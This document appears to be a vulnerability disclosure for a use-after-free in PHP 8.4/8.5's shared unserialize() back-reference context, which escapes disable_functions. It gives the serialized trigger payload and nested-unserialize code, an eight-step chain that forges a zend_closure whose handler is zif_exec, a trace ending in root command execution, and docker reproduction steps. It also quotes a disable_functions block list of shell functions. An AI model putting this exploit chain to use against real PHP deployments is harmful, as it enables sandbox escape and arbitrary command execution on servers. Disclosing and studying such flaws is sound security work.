# PHP 8.5 / 8.4 — `disable_functions` escape via Use-After-Free in the shared `unserialize()` context

**Affected:** PHP 8.5.x and 8.4.x (reproduced on 8.5.12 and 8.4.27).
**Component:** `ext/standard` — `var_unserializer.re`, `var.c`. **Class:** CWE-416 (Use-After-Free) → sandbox escape → OS command execution.

---

## TL;DR

`unserialize()` keeps a single per-request back-reference table (`BG(unserialize).data`) that is **shared by every reentrant `unserialize()` call in the same request** — including a call made from inside `Serializable::unserialize()`. That table stores raw `zval *` pointers into HashTable `arData` buffers.

* A nested `unserialize()` builds an object whose property table is tracked in the shared context.
* Adding properties to that object **resizes (reallocates) the property table, freeing the old `arData` buffer** — while the shared context still holds live pointers into it.
* Reclaiming the freed chunk with a userland string gives PHP-level read/write through those dangling slots.
* A forged `zend_closure` whose `.handler` points at `zif_exec` (behind `exec()`) is finally produced as an object and invoked with normal call syntax.

`disable_functions` is never consulted, because no blocked function is ever called *by name*: the filter is a name lookup at call time, and we call a hand-built `zend_internal_function` instead. Result on a stock hardened build: **`uid=0(root) gid=0(root) groups=0(root)`**, 10 runs out of 10.

---

## 1. Root cause

The unserialize context is a per-*request* global that is deliberately reused, i.e. kept alive (with a nesting counter) across nested calls, so that an `unserialize()` performed from inside `__wakeup()`, `__unserialize()` or `Serializable::unserialize()` can keep using back-references.

`ext/standard/var_unserializer.re`:

```c
PHPAPI php_unserialize_data_t php_var_unserialize_init(void) {
    php_unserialize_data_t d;
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = emalloc(sizeof(struct php_unserialize_data));   /* fresh context */
        ...
        if (!BG(serialize_lock)) {
            BG(unserialize).data = d;                       /* publish it  */
            BG(unserialize).level = 1;
        }
    } else {
        d = BG(unserialize).data;                           /* REUSE the live one */
        ++BG(unserialize).level;
    }
    return d;
}
```

and its counterpart, which only frees the context when the outermost call unwinds:

```c
PHPAPI void php_var_unserialize_destroy(php_unserialize_data_t d) {
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d);
        efree(d);
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level) {
        BG(unserialize).data = NULL;
    }
}
```

The reuse itself is intentional (`var.c` even special-cases nested calls at `BG(unserialize).level > 1`). The defect is *what the context stores*. Object properties are registered with `var_push()` as **raw pointers** to the HashTable value slots:

```c
static inline void var_push(php_unserialize_data_t *var_hashx, zval *rval) {
    var_entries *var_hash = (*var_hashx)->last;
    ...
    var_hash->data[var_hash->used_slots++] = rval;   /* &ht->arData[i].val */
}
```

Those pointers are the `R:`/`r:` back-reference targets, and nothing ties their lifetime to the HashTable's `arData` buffer. Because the context is shared, a *nested* call can register slots pointing at an object property table, and the outer/nested continuation can then grow that same table — `zend_hash_do_resize()` reallocates `arData` and `efree()`s the old buffer. The context now holds dangling slots, still reachable through `var_access()`:

```c
static zval *var_access(php_unserialize_data_t *var_hashx, zend_long id) {
    ...
    return var_hash->data[id];      /* may point into freed arData */
}
```

A `R:<id>;` token in a later (still nested) `unserialize()` therefore reads — and via `var_push_dtor`/`var_replace` can operate on — memory that userland has already reclaimed.

---

## 2. Trigger

The payload is deliberately tiny: an array whose single element is a `Serializable` record (`C:`) whose data is itself the serialized `stdClass` we want to corrupt.

```php
$inner = 'O:8:"stdClass":5:{s:2:"p0";s:2:"v0";s:2:"p1";s:2:"v1";'
       . 's:2:"p2";s:2:"v2";s:2:"p3";s:2:"v3";s:2:"p4";s:2:"v4";}';

$outer = 'a:1:{i:0;C:1:"G":' . strlen($inner) . ':{' . $inner . '}}';

@unserialize($outer, ['allowed_classes' => ['G', 'stdClass']]);
```

The five property pairs force the inner object's property table to exactly 8 slots, so the very next insert crosses the 8 → 16 resize boundary.

Inside `G::unserialize($data)`, which runs while the outer context is still live (`level == 1` → `2`):

```php
$obj  = @unserialize($data, ['allowed_classes' => ['stdClass']]);  // nested, shares the context
$obj->e5 = 'E5'; $obj->e6 = 'E6'; $obj->e7 = 'E7'; $obj->e8 = 'E8';  // 8 -> 16 slots: old arData freed
$s0   = str_repeat("\x00", 263);                                   // reclaim the freed 320-byte bin
```

After that, inside the same outer unserialize, `unserialize('R:4;')` resolves back-reference slot 4 — which now points into `$s0`'s string buffer. Every later step of the exploit is just "write a fake zval into `$s0`, then read it back with `R:4;`".

---

## 3. Exploitation chain

All addresses are derived at runtime; there are no hard-coded offsets, and no shellcode is used.

**[A] Confirm the alias.** Write `{0xdeadbeef, IS_LONG}` at `$s0+40`; `unserialize('R:4;')` returns `0xdeadbeef`.

**[B] Address discovery.** `/proc/self/maps` yields the ZMM/heap regions and the PHP binary's load address (`binary_base`); `/proc/self/exe` (or `PHP_BINARY`) is read and parsed as ELF.

**[C] Find `$s0` in the heap.** Scan the mapped regions for the 8-byte pointer whose target is a 263-byte `zend_string` with the expected header (stride 64, page stepping). This gives `alloc_base`, the address of `$s0`'s string header.

**[D] Arbitrary 8-byte read.** Point slot 4 at a fake `zend_string` (`data = addr-16`, `type_info = IS_STRING`, non-refcounted so PHP never frees or copies it); `strlen()` of the `R:4;` result *is* the 8 bytes at `addr`. Reading a whole chunk is safe because the region is mapped.

**[E] Locate a live closure.** Scan the heap for a `zend_object` whose `gc` header has `IS_OBJECT`, plausible refcount, and a `handle` equal to `spl_object_id()` of a known closure; read its `.ce` (`zend_ce_closure`) and `.handlers` (`closure_handlers`) with the arbitrary read.

**[F] Resolve `zif_exec`.** Scan the ELF `PT_LOAD` segments for a `zend_function_entry` whose `fname` resolves to `"exec\0"` with `num_args == 3`; the handler VMA in that entry is `zif_exec`. A `.symtab` lookup is used first when the binary is not stripped. Runtime address = `binary_base + vma`.

**[G] Forge the callable.** In `$s0`, build a fake `zend_object` (refcount 50, `GC_OBJECT`, `.ce` = real `zend_ce_closure`, `.handlers` = real `closure_handlers`) immediately followed by a fake `zend_internal_function` (`type = 1`, `fn_flags = ZEND_ACC_CLOSURE`, `handler` = `zif_exec`).

**[H] Call it.** Write `{fake_obj, IS_OBJECT}` into slot 4, take the object back from `R:4;`, and call it:

```php
$fake = @unserialize('R:4;');
$fake('id');          // → closure_handlers.get_closure → zif_exec → exec("id")
```

Note what is *not* done: no function is called by name, so `disable_functions` never matches; no return address, GOT entry or stack frame is touched, so RELRO, stack canaries and NX are irrelevant; the reused code lives in the already-executable `.text`, so no page ever becomes writable+executable.

---

## 4. Proof of execution

Environment: `php:8.5-cli`, `PHP 8.5.12 (version_id=80512)`, `php.ini` with
`disable_functions = "exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,proc_nice"`.

Verbose trace:

```text
════════════════════════════════════════════════════════════════════
 PHP disable_functions UAF bypass — verbose trace
════════════════════════════════════════════════════════════════════
 PHP 8.5.12  (version_id=80512)  PID=9
 cmd: id
────────────────────────────────────────────────────────────────────
[maps] binary_base = 0x5563ffa00000
[maps] 3 heap region(s) found:
       [0]  0x556440473000 – 0x55644074f000  (2928KB)
       [1]  0x7fbb21a7f000 – 0x7fbb21b00000  (516KB)
       [2]  0x7fbb21c00000 – 0x7fbb21e00000  (2048KB)
[elf]  exec_vma    = 0x611dd0  (via data-segment scan)
[elf]  zif_exec    = binary_base + exec_vma = 0x556400011dd0
────────────────────────────────────────────────────────────────────
[attempt 0] ────────────────────────────────────────────
[A] OK    IS_LONG UAF → 0xdeadbeef
[C] OK    alloc_base  = 0x7fbb21c7ee40
          in region   [0x7fbb21c00000 – 0x7fbb21e00000)  page=126  stride=57
          $s0 layout  zend_string hdr 24B @ 0x7fbb21c7ee40
[D] OK    arb_read64(alloc_base) → len=263
[E] OK    tmp_clo zend_object @ 0x7fbb21cd5300
          gc.type_info = 0x8  refcount = 1  handle = 4
          .ce       = 0x5564404d54a0  (zend_ce_closure)
          .handlers = 0x5564016e4d40  (closure_handlers)
[F] OK    binary_base = 0x5563ffa00000  (ASLR load address of PHP binary)
          exec_vma    = 0x611dd0  (zif_exec offset from ELF file scan)
          zif_exec    = 0x5563ffa00000 + 0x611dd0 = 0x556400011dd0
[G] OK    forged zend_object:
          .gc.refcount = 50  .gc.type_info = 0x18 (GC_OBJECT)
          .handler[+88] → 0x556400011dd0  (zif_exec)
[H]       R:4; → object @ 0x7fbb21c7ee90 — calling $fake("id") ...
[H] OK    exec() returned: 'uid=0(root) gid=0(root) groups=0(root)'
────────────────────────────────────────────────────────────────────
[+] BYPASS OK after attempt 1
════════════════════════════════════════════════════════════════════
BYPASS OK: uid=0(root) gid=0(root) groups=0(root)
```

Reliability: **10/10** identically-parameterised runs on 8.5.12 and **10/10** on 8.4.27, first attempt every time.

Control, same hardened configuration, no exploit:

```
$ php -c exec.ini -r 'var_dump(function_exists("exec"));'
bool(false)

$ php -c exec.ini -r 'exec("id");'
PHP Fatal error:  Uncaught Error: Call to undefined function exec()
```

Side-effect proof — the PoC was pointed at a bind-mounted directory, and the file it wrote is inspectable from outside the container, owned by `root`:

```text
$ docker run --rm -v $PWD:/poc php:8.5-cli \
    php -c /poc/exec.ini /poc/uaf.php \
    "id > /poc/EXEC_PROOF.txt; id -u >> /poc/EXEC_PROOF.txt; cat /etc/hostname >> /poc/EXEC_PROOF.txt"

$ cat EXEC_PROOF.txt
uid=0(root) gid=0(root) groups=0(root)
0
b23e86b0e2b4
$ ls -l EXEC_PROOF.txt
-rw-r--r-- 1 root root 54 ... EXEC_PROOF.txt
```

---

## 5. Reproduction

Two files, `uaf.php` and `exec.ini`, are all that is needed.

```bash
# latest 8.5.x
docker run --rm -v $PWD:/poc php:8.5-cli \
    php -c /poc/exec.ini /poc/uaf.php 'id; id -u'

# latest 8.4.x
docker run --rm -v $PWD:/poc php:8.4-cli \
    php -c /poc/exec.ini /poc/uaf.php 'id; id -u'
```

| File | Purpose |
|---|---|
| `uaf.php` | The PoC — `php -c exec.ini uaf.php <command>`; the command defaults to `id` |
| `exec.ini` | `disable_functions = "exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,proc_nice"`, `allow_url_fopen=Off`, `allow_url_include=Off` |

Expected last line: `BYPASS OK: uid=0(root) gid=0(root) groups=0(root)`.
